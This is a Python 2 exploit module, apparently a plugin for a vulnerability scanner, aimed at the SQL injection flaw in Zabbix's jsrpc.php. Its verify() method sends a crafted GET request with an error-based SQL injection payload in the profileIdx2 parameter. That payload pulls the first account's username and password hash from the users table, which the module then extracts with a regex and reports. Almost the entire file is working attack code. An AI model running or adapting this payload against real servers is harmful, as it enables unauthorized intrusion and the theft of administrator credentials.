#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Lcy
# @Date:   2016-09-20 15:34:41
# @Last Modified by:   Lcy
# @Last Modified time: 2016-09-26 16:55:21
import requests
import urlparse
import re
class Exploit:
    def __init__(self,target,expfile):
        self.target = target
        self.result = {
            "name": "zabbix jsrpc.php SQL注入漏洞",
            "author": "Lcy",
            "type": "website",
            "ref": "https://phpinfo.me/2016/08/18/1307.html",
            "status":False,
            "info":"",
            'filename':expfile,
            "target":target,
        }
    def verify(self):
        vulurl = urlparse.urljoin(self.target, '/zabbix/jsrpc.php')
        payload = "?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select%20(1)%20from%20users%20where%201=1%20aNd%20(SELECT%201%20FROM%20(select%20count(*),concat(floor(rand(0)*2),(substring((Select%20(select%20concat(alias,0x7e,passwd,0x7e)%20from%20users%20limit%201)),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b))&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
        resp = requests.get(vulurl + payload,timeout=5)
        if resp.status_code == 200:
            match_result = re.search(r'entry \'1(.+)\~(.+)\~', resp.content, re.I | re.M)
            if match_result:
                self.result['status'] = True
                self.result['info'] = "目标存在zabbix jsrpc.php SQL注入漏洞,注入结果%s|%s" % (match_result.group(1).split('~')[0],match_result.group(2))
       